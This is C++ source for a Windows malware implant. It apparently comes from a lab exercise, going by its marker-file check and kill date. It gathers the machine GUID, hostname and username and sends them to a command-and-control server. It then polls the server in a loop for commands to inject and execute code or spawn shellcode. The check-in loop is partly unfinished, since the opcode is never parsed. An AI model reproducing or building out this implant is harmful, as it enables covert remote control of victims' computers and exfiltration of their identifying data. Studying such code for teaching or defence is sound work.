#include <windows.h>
#include <string.h>
#include <sysinfoapi.h>
#include <winbase.h>
#include <winreg.h>
#include <lmcons.h>

#include "config.h"
#include "httpClient.h"
#include "loader.h"

enum OpCodes
{
    SLEEP = 0,
    INJECT_EXECUTE_CODE,
    SPAWN_SHELL_CODE,
    KILL
};

int wmain(int argc, wchar_t **argv, wchar_t **envp)
{
    // HANDLE namedPipe = CreateNamedPipeA(MALWARE_NAMED_PIPE, PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE, 2, 512, 512, 0, NULL);
    // if (namedPipe == INVALID_HANDLE_VALUE)
    // {
    //     LOG(L"Only one instance at a time!\n");
    //     return 1;
    // }
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributesA(MALWARE_FILE_EXISTS_STRING) && GetLastError() == ERROR_FILE_NOT_FOUND)
    {
        // LOG(L"No ch0nky.txt\n");
        return -1;
    }
    SYSTEMTIME currentTime;
    GetSystemTime(&currentTime);
    if (MALWARE_KILL_DATE_YEAR <= currentTime.wYear && MALWARE_KILL_DATE_MONTH <= currentTime.wMonth && MALWARE_KILL_DATE_DAY < currentTime.wDay)
    {
        // LOG(L"Kill Date passed!\n");
        return -1;
    }
    char systemGuidValue[255];
    DWORD systemGuidBufferSize = 255;
    char systemHostname[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD systemHostnameBufferSize = MAX_COMPUTERNAME_LENGTH + 1;
    char systemUsername[UNLEN + 1];
    DWORD systemUsernameBufferSize = UNLEN + 1;
    if (RegGetValueA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Cryptography", "MachineGuid", RRF_RT_REG_SZ, NULL, systemGuidValue, &systemGuidBufferSize) != 0 || GetComputerNameA(systemHostname, &systemHostnameBufferSize) == 0 || GetUserNameA(systemUsername, &systemUsernameBufferSize) == 0)
    {
        // Can't register at this point don't know what to do yet.
        // LOG(L"GUID: %s\n", systemGuidValue);
        // LOG(L"Hostname: %s\n", systemHostname);
        // LOG(L"Username: %s\n", systemUsername);
        return -1;
    }
    std::wstring requestHeader(MALWARE_JSON_REQUEST_HEADER); // build post request header
    std::string requestBody;                                // build post request body i.e. json
    requestBody += "{\"guid\":\"";
    requestBody += systemGuidValue;
    requestBody += "\",\"hostname\":\"";
    requestBody += systemHostname;
    requestBody += "\",\"username\":\"";
    requestBody += systemUsername;
    requestBody += "\"}";
    std::wstring result;
    do
    {
        Sleep(MALWARE_SLEEP_MILLISECONDS_JITTER);
        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_REGISTER_URI, requestHeader, requestBody, MALWARE_C2_SERVER_USE_TLS);
        std::wcout << result << std::endl;
    } while (result == L"error");
    /*we should be registered, goto main event loop*/
    /*additional init should go here*/
    bool Success = false;
    std::wstring buffer;
    int opCode;
    while (true)
    {
        result = makeHttpRequest(MALWARE_C2_SERVER_ADDRESS, MALWARE_C2_SERVER_PORT, MALWARE_C2_SERVER_CHECKIN_URI, L"", "", MALWARE_C2_SERVER_USE_TLS);
        
        switch (opCode)
        {
        case SLEEP:
            Sleep(MALWARE_SLEEP_MILLISECONDS_JITTER);
            Success = true;
            break;

        case INJECT_EXECUTE_CODE:
            Success = InjectExecutionCode(buffer);
            break;

        case SPAWN_SHELL_CODE:
            Success = SpawnShellCode(buffer);
            break;

        case KILL:
            return 0;
        }
        if (!Success)
        {
            break;
        }
    }
    return 0;
}